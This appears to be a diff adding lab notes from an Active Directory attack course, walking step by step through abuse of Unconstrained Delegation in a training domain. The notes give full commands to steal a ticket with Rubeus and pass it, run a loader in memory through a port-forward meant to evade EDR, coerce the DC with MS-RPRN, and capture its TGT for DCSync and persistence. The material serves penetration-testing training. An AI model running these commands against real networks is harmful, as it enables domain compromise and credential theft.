@@ -1,0 +1,31 @@
+- Find a server in the dcorp domain where Unconstrained Delegation is enabled.
+	- On the student VM, after loading PowerView:
+		- `Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname`
+			- The command brings up `dcorp-appsrv$` and `dcorp-dc$`.
+			- Recall that when we extracted credentials from `dcorp-adminsrv`, we also extracted the credentials from `appadmin` as well, which is a local administrator on `dcorp-appsrv`.
+ - Compromise the server and escalate to DA privileges.
+	- Let's start a process with the credentials of `appadmin`, and hunt for local admin privileges for this user:
+		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:<aes256 hash of appadmin> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
+			- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
+			- `. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
+			- `Find-PSRemotingLocalAdminAccess`
+				- If we get an error for this command, which states that the parameter `ComputerName` cannot be validated, we can retry the command after defining the domain address using the `-Domain` flag.
+				- `Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local`
+				- We will find out that the `appadmin` user has local admin access on `dcorp-adminsrv` and `dcorp-appsrv`.
+		- Now we will run Rubeus' monitor mode, in memory, on `dcorp-appsrv`, after copying Loader.exe on it from the `appadmin` session we have running, and adding a port-forwarding rule to prevent connection based EDR detection:
+			- `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y`
+			- `winrs -r:dcorp-appsrv cmd`
+			- `netsh interface portproxy add v4tov4 listenport=8000 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+			- `C:\Users\Public\Loader.exe -path http://127.0.0.1:8000/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap`
+				- We obviously need to have the HFS server up at this point.
+		- All we now need to do is to go back to the studentVM and force the DC to connect to `dcorp-appsrv`.
+			- `C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
+				- Even if we get an error after executing this command, we should always make sure to check Rubeus monitor mode running on the server that has Unconstrained Delegation enabled (`dcorp-appsrv` in this case), we may still get a TGT there.
+		- From an elevated CMD shell, we can now use the TGT with Rubeus to connect to the DC:
+			- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:<the DC's ticket that we just got by performing Unconstrained Delegation abuse>`
+			- `klist`
+			- We can now perform a DCSync attack and get the credentials for all the domain users, after which what we should do is to get the secrets for the krbtgt account and perform a Diamond Ticket Attack for persistence.
+- Escalate to Enterprise Admin privileges by abusing Printer Bug!
+	- Un-demonstrated: do on your own time.
+- Additionally, abuse Unconstrained Delegation with `MS-WSP` and `MSF-DFSNM`.
+	- Un-demonstrated: do on your own time.
